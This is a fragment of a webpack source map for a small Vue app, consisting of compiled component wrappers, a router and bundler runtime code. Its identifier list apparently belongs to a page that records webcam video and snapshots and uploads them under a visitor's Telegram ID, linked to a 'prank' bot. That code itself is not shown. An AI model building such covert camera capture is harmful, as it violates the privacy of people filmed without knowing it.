\"./MainPage.vue?vue&type=style&index=0&id=39726fa0&scoped=true&lang=css\"\n\nimport exportComponent from \"../../node_modules/vue-loader/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render],['__scopeId',\"data-v-39726fa0\"]])\n\nexport default __exports__","<template>\n        \n        <CInformationAbout></CInformationAbout>\n</template>\n\n<script>\nimport CInformationAbout from '@/components/cInformationAbout.vue';\n\n\n\n    export default {\n        name: \"SuccessPage\",\n        components:{CInformationAbout},\n        data (){\n            return {\n\n            }\n        }\n    }\n</script>\n\n<style>\nbody{\n    display: flex;\n    justify-content: center;\n\n}\n.cm{\n    margin-top: 15px;\n}\n@media (max-width:525px) {\n    body{\n      flex-direction: column;\n      justify-content: flex-start;\n    }\n  \n  }\n</style>","import { render } from \"./SuccessPage.vue?vue&type=template&id=4b3cf332\"\nimport script from \"./SuccessPage.vue?vue&type=script&lang=js\"\nexport * from \"./SuccessPage.vue?vue&type=script&lang=js\"\n\nimport \"./SuccessPage.vue?vue&type=style&index=0&id=4b3cf332&lang=css\"\n\nimport exportComponent from \"../../node_modules/vue-loader/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render]])\n\nexport default __exports__","<template>\n    <div>\n        404\n    </div>\n</template>\n<script>\nexport default {\n    mounted (){\n        window.location.href = 'https://web.telegram.org/k/#@WallPrankBot'\n    }\n}\n</script>\n<style>\n    \n</style>","import { render } from \"./ReplaceTG.vue?vue&type=template&id=ad8360aa\"\nimport script from \"./ReplaceTG.vue?vue&type=script&lang=js\"\nexport * from \"./ReplaceTG.vue?vue&type=script&lang=js\"\n\nimport exportComponent from \"../../node_modules/vue-loader/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render]])\n\nexport default __exports__","import { createRouter, createWebHistory } from 'vue-router'\n\nimport MainPage from '@/pages/MainPage.vue'\nimport SuccessPage from './pages/SuccessPage.vue'\nimport ReplaceTG from './pages/ReplaceTG.vue'\n\nconst routes = [\n  {name: 'replacetg', path: '/', component: ReplaceTG},\n  { name: 'main', path: '/:telegram_id', component: MainPage  },\n  { name:'success_page', path:'/p/success', component: SuccessPage }\n]\n\nconst router = createRouter({\n  history: createWebHistory(),\n  routes,\n})\n\nexport default router","import { createApp } from 'vue'\nimport App from './App.vue'\nimport router from './router'\n\n\nconst app = createApp(App)\napp.use(router)\napp.mount('#app')","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n// expose the modules object (__webpack_modules__)\n__webpack_require__.m = __webpack_modules__;\n\n","var deferred = [];\n__webpack_require__.O = function(result, chunkIds, fn, priority) {\n\tif(chunkIds) {\n\t\tpriority = priority || 0;\n\t\tfor(var i = deferred.length; i > 0 && deferred[i - 1][2] > priority; i--) deferred[i] = deferred[i - 1];\n\t\tdeferred[i] = [chunkIds, fn, priority];\n\t\treturn;\n\t}\n\tvar notFulfilled = Infinity;\n\tfor (var i = 0; i < deferred.length; i++) {\n\t\tvar chunkIds = deferred[i][0];\n\t\tvar fn = deferred[i][1];\n\t\tvar priority = deferred[i][2];\n\t\tvar fulfilled = true;\n\t\tfor (var j = 0; j < chunkIds.length; j++) {\n\t\t\tif ((priority & 1 === 0 || notFulfilled >= priority) && Object.keys(__webpack_require__.O).every(function(key) { return __webpack_require__.O[key](chunkIds[j]); })) {\n\t\t\t\tchunkIds.splice(j--, 1);\n\t\t\t} else {\n\t\t\t\tfulfilled = false;\n\t\t\t\tif(priority < notFulfilled) notFulfilled = priority;\n\t\t\t}\n\t\t}\n\t\tif(fulfilled) {\n\t\t\tdeferred.splice(i--, 1)\n\t\t\tvar r = fn();\n\t\t\tif (r !== undefined) result = r;\n\t\t}\n\t}\n\treturn result;\n};","// getDefaultExport function for compatibility with non-harmony modules\n__webpack_require__.n = function(module) {\n\tvar getter = module && module.__esModule ?\n\t\tfunction() { return module['default']; } :\n\t\tfunction() { return module; };\n\t__webpack_require__.d(getter, { a: getter });\n\treturn getter;\n};","// define getter functions for harmony exports\n__webpack_require__.d = function(exports, definition) {\n\tfor(var key in definition) {\n\t\tif(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {\n\t\t\tObject.defineProperty(exports, key, { enumerable: true, get: definition[key] });\n\t\t}\n\t}\n};","__webpack_require__.g = (function() {\n\tif (typeof globalThis === 'object') return globalThis;\n\ttry {\n\t\treturn this || new Function('return this')();\n\t} catch (e) {\n\t\tif (typeof window === 'object') return window;\n\t}\n})();","__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }","__webpack_require__.p = \"/\";","// no baseURI\n\n// object to store loaded and loading chunks\n// undefined = chunk not loaded, null = chunk preloaded/prefetched\n// [resolve, reject, Promise] = chunk loading, 0 = chunk loaded\nvar installedChunks = {\n\t524: 0\n};\n\n// no chunk on demand loading\n\n// no prefetching\n\n// no preloaded\n\n// no HMR\n\n// no HMR manifest\n\n__webpack_require__.O.j = function(chunkId) { return installedChunks[chunkId] === 0; };\n\n// install a JSONP callback for chunk loading\nvar webpackJsonpCallback = function(parentChunkLoadingFunction, data) {\n\tvar chunkIds = data[0];\n\tvar moreModules = data[1];\n\tvar runtime = data[2];\n\t// add \"moreModules\" to the modules object,\n\t// then flag all \"chunkIds\" as loaded and fire callback\n\tvar moduleId, chunkId, i = 0;\n\tif(chunkIds.some(function(id) { return installedChunks[id] !== 0; })) {\n\t\tfor(moduleId in moreModules) {\n\t\t\tif(__webpack_require__.o(moreModules, moduleId)) {\n\t\t\t\t__webpack_require__.m[moduleId] = moreModules[moduleId];\n\t\t\t}\n\t\t}\n\t\tif(runtime) var result = runtime(__webpack_require__);\n\t}\n\tif(parentChunkLoadingFunction) parentChunkLoadingFunction(data);\n\tfor(;i < chunkIds.length; i++) {\n\t\tchunkId = chunkIds[i];\n\t\tif(__webpack_require__.o(installedChunks, chunkId) && installedChunks[chunkId]) {\n\t\t\tinstalledChunks[chunkId][0]();\n\t\t}\n\t\tinstalledChunks[chunkId] = 0;\n\t}\n\treturn __webpack_require__.O(result);\n}\n\nvar chunkLoadingGlobal = self[\"webpackChunkfrontend\"] = self[\"webpackChunkfrontend\"] || [];\nchunkLoadingGlobal.forEach(webpackJsonpCallback.bind(null, 0));\nchunkLoadingGlobal.push = webpackJsonpCallback.bind(null, chunkLoadingGlobal.push.bind(chunkLoadingGlobal));","// startup\n// Load entry module and return exports\n// This entry module depends on other loaded chunks and execution need to be delayed\nvar __webpack_exports__ = __webpack_require__.O(undefined, [504], function() { return __webpack_require__(7026); })\n__webpack_exports__ = __webpack_require__.O(__webpack_exports__);\n"],"names":["_createBlock","_component_router_view","name","__exports__","render","key","class","ref","src","_imports_0","width","height","alt","autoplay","_createElementBlock","_Fragment","$data","isActiveMainImage","_hoisted_1","_createCommentVNode","_createElementVNode","_hoisted_2","isActiveCameraBlock","_component_CameraObj","infoBlockActive","_component_CInformationAbout","_hoisted_3","_createStaticVNode","_imports_1","_imports_2","_imports_3","_imports_4","_imports_5","_createVNode","_component_CLoader","_imports_6","_imports_7","_imports_8","components","CLoader","_cache","href","data","prankBotURL","CameraObj","CInformationAbout","video_name","uuidv4","stream","videoChunks","telegramId","this","$route","params","telegram_id","isActiveCanvas","isActiveCameraVideo","baseUrl","mounted","startCamera","document","title","methods","console","log","$refs","camera_obj","navigator","mediaDevices","getUserMedia","video","then","mediaStream","srcObject","options","mimeType","mediaRecorder","MediaRecorder","CHUNK_INTERVAL","ondataavailable","async","chunk","event","formData","FormData","append","fetch","method","body","error","start","addEventListener","setTimeout","takeSnapshot","window","stop","getTracks","forEach","track","catch","err","stopCamera","tracks","canvas","context","getContext","drawImage","imageData","toDataURL","startRecording","sendData","videoBlob","photoBlob","dataURItoBlob","response","json","previewModalWindow","dataURI","byteString","atob","split","mimeString","ab","ArrayBuffer","length","ia","Uint8Array","i","charCodeAt","Blob","type","beforeUnmount","location","routes","path","component","ReplaceTG","MainPage","SuccessPage","router","createRouter","history","createWebHistory","app","createApp","App","use","mount","__webpack_module_cache__","__webpack_require__","moduleId","cachedModule","undefined","exports","module","__webpack_modules__","call","m","deferred","O","result","chunkIds","fn","priority","notFulfilled","Infinity","fulfilled","j","Object","keys","every","splice","r","n","getter","__esModule","d","a","definition","o","defineProperty","enumerable","get","g","globalThis","Function","e","obj","prop","prototype","hasOwnProperty","p","installedChunks","chunkId","webpackJsonpCallback","parentChunkLoadingFunction","moreModules","runtime","some","id","chunkLoadingGlobal","self","bind","push","__webpack_exports__"],"sourceRoot":""}